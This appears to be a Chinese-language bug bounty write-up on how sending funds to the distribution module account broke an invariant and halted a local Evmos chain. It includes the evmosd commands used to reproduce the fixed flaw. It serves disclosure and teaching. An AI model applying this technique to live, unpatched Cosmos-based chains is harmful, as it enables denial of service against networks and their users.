#  【15万$】通过阅读文档发现Evmos中的高危漏洞   
白帽子左一  白帽子左一   2025-02-12 04:04  
  
扫码领资料  
  
获网安教程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**来****Track安全社区投稿~**  
  
**赢千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
  
作为 Web3 安全研究员的生活通常涉及深入研究难以掌握的技术主题。因此，我们有时会认为关键漏洞应该是复杂且难以发现的，但实际上，情况可能恰恰相反。一些最赚钱的漏洞通常非常简单，只需稍加研究就能迅速发现。  
这正是我在   
Immunefi[1] 的 Evmos 漏洞赏金计划中遇到的情况。简单来说，我通过阅读 Evmos 所基于的 Cosmos 文档，发现了一个关键漏洞，该漏洞可以导致 Evmos 区块链及其上所有 dApp 停止运行。希望这个案例能向其他安全研究员展示，虽然深入理解协议对于发现复杂漏洞至关重要，但也不要忽视那些“低垂的果实”（容易被忽视的简单漏洞）。  
## Evmos 和 Cosmos 区块链  
  
Evmos 区块链是基于 Cosmos 模块化区块链框架构建的，该框架允许用户轻松搭建特定于应用的区块链。Cosmos 采用 Golang 编写，这对于习惯 Solidity 语言的安全研究员来说可能是完全不同的体验。不过，经过一两周的学习和实践，掌握 Cosmos 还是相对容易的。  
  
了解了这些背景后，让我们看看我是如何仅通过阅读 Cosmos 文档就发现 Evmos 的关键漏洞的。  
## Cosmos 文档  
  
Cosmos 框架提供了详细的  
文档[2]，帮助开发者快速上手。作为一名合格的 Web3 安全研究员，我的第一步就是审查 Cosmos 文档，因为它是 Evmos 的基础。通过学习文档，我开始了解 Cosmos 模块系统，它提供了区块链的基本功能。例如，bank 模块具备内置的账户间资金转移功能。  
  
在深入研究 bank 模块时，我发现了一个有趣的概念：“模块账户（module accounts）”。这些账户执行与模块相关的特定任务，但通常不应该接收资金。  
官方文档[3] 对此进行了详细解释：  
  
x/bank 模块接受一个地址映射，这些地址被视为黑名单，禁止直接接收资金。  
  
通常，这些地址是模块账户。如果这些地址收到超出状态机规则的资金，可能会破坏区块链的不变量，并导致网络停止运行。  
  
读到这里，一个优秀的安全研究员可能会想到：“他们直接告诉了我们如何让 Cosmos 区块链崩溃。” 那么……我们来试试看吧。  
## 漏洞分析  
  
我们的目标是向一个不应接收资金的模块账户转账，以破坏区块链的不变量，从而导致整个 Evmos 区块链停止运行。测试该漏洞的步骤如下：  
  
1.克隆 Evmos 区块链代码的 GitHub 仓库。  
  
2.在 Cosmos 区块链中，通常需要执行一系列步骤来正确启动区块链。这些步骤大致相同，包括：  
```
- 初始化区块链
- 添加有资金的创世账户
- 生成创世交易
- 收集创世交易
- 启动区块链
```  
  
这些命令通常如下所示：  
```
evmosd init evmos -o
evmosd add-genesis-account bob 100000000000stake,100000000000aevmos
evmosd gentx bob 70000000stake --chain-id evmos
evmosd collect-gentxs
evmosd start
```  
  
幸运的是，Evmos 已经提供了一个脚本来自动执行这些命令，因此我只需要使用特定参数运行 evmosd start 命令，即可启动区块链并生成区块。  
```
evmosd start --inv-check-period 5 --pruning=nothing $TRACE --log_level $LOGLEVEL --minimum-gas-prices=0.0001aevmos --json-rpc.api eth,txpool,personal,net,debug,web3.
```  
  
**3. 发送资金至分发模块账户**  
  
在区块链运行时，打开另一个终端，并执行以下命令，将资金发送到 **distribution（分发）模块账户**。在安全的 Cosmos 区块链中，这种操作本应被禁止。  
  
所有的模块账户地址可以通过在另一个终端运行以下命令查看：  
```
evmosd query auth accounts
```  
  
要获取 **mykey** 账户（区块链初始化时默认的账户），可以运行以下命令：  
```
evmosd keys list
```  
  
运行后，你会看到 **mykey** 账户地址，它的前缀是 evmos。然后，使用以下命令向 **distribution 模块账户** 发送资金（请替换 <mykey 地址> 和 <distribution 账户地址>）。  
```
evmosd tx bank send <mykey 地址> <distribution 账户地址> 100aevmos --gas-prices 20aevmos
```  
  
**4. 触发漏洞，导致 Evmos 区块链崩溃**  
  
执行上述命令后，我成功地向 **distribution 模块账户** 发送了资金，导致了以下错误：  
```
ERR CONSENSUS FAILURE!!! err="invariant broken: distribution"
```  
  
至此，区块链 **不再生成任何新区块，整个链完全停止运行**，从而导致 **Evmos 区块链及其上的所有 dApp 崩溃**。  
  
当然，这个漏洞已经被 Evmos 团队修复。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHia9QjlDQxtbFLU5iakFmvQ70O1PsTR0GQE077TqRey8OfIQeRLrVPLeZftGF0gAlibbZO91pXPzibQA/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 总结  
  
这个相对简单的漏洞最终为我带来了 **$150,000** 的漏洞赏金，属于**关键级别（critical）**的发现。这个漏洞让我作为安全研究人员学到了几个重要的经验：  
  
首先，最明显的一点是——**始终要彻底阅读你正在研究的项目文档**。 其次，一个更深刻的体会是——**有时最关键的漏洞可能极其简单**。 第三，**我们不必人为地让漏洞挖掘变得更困难**，有时候最简单的漏洞往往价值最高。 最后，**在寻找复杂漏洞的过程中，我们绝不能忽视那些“低垂的果实”（容易发现的漏洞）**。  
### References  
  
[1] Immunefi: https://immunefi.com/[2] 文档: https://docs.cosmos.network/v0.46/intro/overview.html[3] 官方文档: https://docs.cosmos.network/v0.46/modules/bank/02_keepers.html#common-types  
  
**声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学********习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。所有渗透都需获取授权！**  
  
**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk安全知识星球,我们一起进步一起学习。星球不定期会分享一些前沿漏洞，每周安全面试经验、SRC实战纪实等文章分享，微信识别二维码，即可加入。**  
  
****  
  
